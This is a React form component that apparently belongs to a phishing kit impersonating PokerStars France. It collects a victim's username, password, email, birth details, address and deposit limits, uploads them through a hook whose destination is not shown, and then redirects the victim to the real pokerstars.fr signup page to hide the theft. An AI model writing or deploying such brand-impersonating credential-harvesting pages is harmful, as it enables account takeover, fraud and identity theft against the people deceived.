import React, { useState } from "react";
import { MdNavigateNext } from "react-icons/md";
import { GrFormPrevious } from "react-icons/gr";
import { useNext } from "./useNext";
import { usePrevious } from "./usePrevios";
import { useSaveMultipleData } from "./useSaveData";
import { useUpload } from "./useUpload";
import { Spinner } from "react-bootstrap";
import Svg from "./svg";
import { useRecoilValue } from "recoil";
import { PokerStarsData } from "@/app/atoms/pokerStarsData";
import { countries } from "./countries";
const boldStyle = { fontWeight: "bold", color: '#05D6AE' };
const inputStyle = { backgroundColor: 'transparent', borderTop: '0', borderBottom: '1px solid silver', borderRight: '0', borderLeft: '0', borderRadius: '0px', color: 'white',outline:'none' }
export const Form2 = () => {
  const [state, setState] = useState("");
  const [city, setCity] = useState("");
  const [postcode, setPostCode] = useState("");
  const [sevendaylimit, setSevenDayLimit] = useState("");
  const [sevendayMinimumLimit, setSevendayMinimumLimit] = useState("");
  const [address, setAddress] = useState("");
  const [sevendayMaxmimumLimit, setSevendayMaxmimumLimit] = useState("");
  const [autoMaticWithdrawalLimit, setAutoMaticWithdrawalLimit] = useState("");
  const [loading, setLoading] = useState(false);
  const pokerStarsData = useRecoilValue(PokerStarsData);
  const upload = useUpload();
  const prev = usePrevious();
  const saveData = useSaveMultipleData();
  const handlePrev = () => {
    prev();
  };
  const handleUpload = (d) => {
    return upload(d);
  };
  const handleNext = async (e) => {
    console.log('handlenext')
    e.preventDefault();
    setLoading(true);
    const dataOb = {
      countryf1: pokerStarsData.countryf1,
      username: pokerStarsData.username,
      password: pokerStarsData.password,
      email: pokerStarsData.email,
      dob: pokerStarsData.dob,
      countryofbirth: pokerStarsData.countryofbirth,
      stateofbirth: pokerStarsData.stateofbirth,
      cityofbirth: pokerStarsData.cityofbirth,
      address: address,
      state: state,
      city: city,
      postcode: postcode,
      firstname: pokerStarsData.firstname,
      lastname: pokerStarsData.lastname,
      gender: pokerStarsData.gender,
      sevenlimit: sevendaylimit.toString(),
      weeklylimit: sevendayMinimumLimit.toString(),
      depositlimit: sevendayMaxmimumLimit.toString(),
      autowithlimit: autoMaticWithdrawalLimit.toString(),
    };

    console.log("upload data");
    // Upload data
    const uploadSuccess = await handleUpload(dataOb);
    if (uploadSuccess) {
      console.log("Data uploaded successfully");
      window.location.href =
        "https://www.pokerstars.fr/signup?brand=4&redirectTo=/sports";
    } else {
      console.error("Data upload failed");
    }
  };
  return (
    <div className="container-fluid">
      <div className="row">
        <div className="col-md-4 left-column d-flex flex-column ">
          <nav className="navbar navbar-expand-lg navbar-dark ms-4">
            <Svg />
          </nav>
          <img
            src="/pokerimages/istockphoto-1437726104-612x612.jpg"
            className="img-left mt-5"
            alt="Placeholder"
          />
        </div>
        <div className="col-md-8 right-column " style={{ backgroundColor: "black", color: "white" }}>
          <div className="row justify-content-center justify-content-md-center">
            <div
              style={{
                backgroundColor: "black",
                color: "white",
                fontWeight: "bolder",
              }}
              className=" text-center mb-2 pt-4"
            >
              <h4 className="" style={{ fontWeight: "900" }}>
                Informations de compte
              </h4>
            </div>
            <div
              className="col-lg-10 col-md-10 col-sm-10"
              id="secondary-div-center"
            >
              <div className="">
                <h5
                  style={{
                    fontSize: "25px",
                    color: "#D70022",
                    fontWeight: "bolder",
                  }}
                  className="mb-4"
                >
                  Où habitez-vous donc,?
                </h5>
                <form onSubmit={handleNext} className="" style={{ backgroundColor: "black" }}>
                  <div className="row justify-content-center justify-content-md-start">
                    <div className="col-10 col-md-6 mb-3">
                      <label style={boldStyle} htmlFor="last-name">
                        Pays
                      </label>
                      <select
                        className="form-select form-input-border"
                        required
                        style={inputStyle}
                      >
                        {countries.map((country, index) => (
                          <option key={index}>{country}</option>
                        ))}
                      </select>
                    </div>

                    <div className="col-10 col-md-6">
                      <label style={boldStyle} htmlFor="email">
                        Adresse
                      </label>
                      <input
                        onChange={(e) => {
                          setAddress(e.target.value);
                        }}
                        type="text"
                        className="form-control"
                        id="text"
                        placeholder=""
                        required
                        style={inputStyle}
                      />
                    </div>

                    <div className="col-md-6  mb-3">
                      <label style={boldStyle} htmlFor="email">
                        Département
                      </label>
                      <input
                        onChange={(e) => {
                          setState(e.target.value);
                        }}
                        type="text"
                        className="form-control"
                        id="text"
                        placeholder=""
                        required
                        style={inputStyle}
                      />
                    </div>

                    <div className="col-md-6">
                      <label style={boldStyle} htmlFor="time">
                        Ville
                      </label>
                      <input
                        onChange={(e) => {
                          setCity(e.target.value);
                        }}
                        type="text"
                        className="form-control"
                        id="time"
                        placeholder=""
                        required
                        style={inputStyle}
                      />
                    </div>

                    <div className="col-md-6">
                      <label style={boldStyle} htmlFor="email">
                        Code postal
                      </label>
                      <input
                        onChange={(e) => {
                          setPostCode(e.target.value);
                        }}
                        type="text"
                        className="form-control"
                        id="text"
                        placeholder=""
                        required
                        style={inputStyle}
                      />
                    </div>
                  </div>
                </form>

              </div>

              <div className="">



                <div className="form-group mb-4">



                  <div className="mt-5">
                    <h5
                      style={{
                        fontSize: "25px",
                        color: "#D70022",
                        fontWeight: "bolder",
                      }}
                      className="mb-3"
                    >
                      Limite de dépôt{" "}
                    </h5>
                    <div className="row justify-content-center justify-content-md-start">
                      <div className="col-10 col-md-6">
                        <label style={boldStyle} htmlFor="last-name">
                          Limite de 7 jours
                        </label>
                        <input
                          onChange={(e) => {
                            setSevenDayLimit(e.target.value);
                          }}
                          type="text"
                          className="form-control"
                          id="last-name"
                          placeholder=""
                          required
                          style={inputStyle}

                        />
                      </div>

                    </div>
                  </div>

                  <div className="mt-5">
                    <h5
                      style={{
                        fontSize: "25px",
                        color: "#D70022",
                        fontWeight: "bolder",
                      }}
                      className="mb-4"
                    >
                      Limite cumulée
                    </h5>
                    <div className="row justify-content-center justify-content-md-start">
                      <div className="col-10 col-md-6">
                        <label style={boldStyle} htmlFor="last-name">
                          Limite de mise sur sept jours au poker
                        </label>
                        <select
                          onChange={(e) => {
                            setSevendayMinimumLimit(e.target.value);
                          }}
                          className="form-select form-input-border"
                          required
                          style={inputStyle}
                        >
                          <option>1000</option>
                          <option>2000</option>

                          <option>3000</option>

                          <option>4000</option>

                          <option>5000</option>
                        </select>
                      </div>
                      <div className="col-10 col-md-6">
                        <label style={boldStyle} htmlFor="last-name">
                          Limite de mises sur sept jours aux paris
                        </label>
                        <select
                          onChange={(e) => {
                            setSevendayMaxmimumLimit(e.target.value);
                          }}
                          className="form-select form-input-border"
                          required
                          style={inputStyle}
                        >
                          <option>1000</option>
                          <option>2000</option>

                          <option>3000</option>

                          <option>4000</option>

                          <option>5000</option>
                        </select>
                      </div>
                    </div>
                  </div>

                  <div className="mt-5">
                    <h5
                      style={{
                        fontSize: "25px",
                        color: "#D70022",
                        fontWeight: "bolder",
                      }}
                      className=""
                    >
                      Fixer la limite de retrait automatique
                    </h5>
                    <div className="row justify-content-center justify-content-md-start">
                      <div className="col-10 col-md-6">
                        <label
                          style={boldStyle}
                          htmlFor="last-name"
                        ></label>
                        <select
                          onChange={(e) => {
                            setAutoMaticWithdrawalLimit(e.target.value);
                          }}
                          className="form-select form-input-border"
                          required
                          style={inputStyle}
                        >
                          <option>1000</option>
                          <option>2000</option>

                          <option>3000</option>

                          <option>4000</option>

                          <option>5000</option>
                        </select>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="row justify-content-center py-3">
                  <div className="col-10 d-flex justify-content-between flex-wrap">
                    <button
                      className="btn mb-3 mb-md-0"
                      onClick={handlePrev}
                      style={{
                        borderRadius: "18px",
                        width: "100%",
                        maxWidth: "186px",
                        color: "white",
                        fontWeight: "700",
                        backgroundColor: "#000000",
                      }}
                    >
                      <GrFormPrevious style={{ fontSize: "25px" }} />{" "}
                      Précédent
                    </button>
                    <button
                      className="btn"
                      type="submit"
                      onClick={handleNext}
                      style={{
                        borderRadius: "18px",
                        width: "100%",
                        maxWidth: "186px",
                        color: "white",
                        fontWeight: "700",
                        backgroundColor: "#190A05",
                        background:
                          "-webkit-linear-gradient(to bottom, #870000, #190a05)",
                        background:
                          "linear-gradient(to bottom, #FF0000, #190a05)",
                      }}
                    >
                      {loading && (
                        <Spinner animation="border" variant="light" />
                      )}
                      {!loading && (
                        <>
                          Continuer{" "}
                          <MdNavigateNext style={{ fontSize: "25px" }} />
                        </>
                      )}
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};


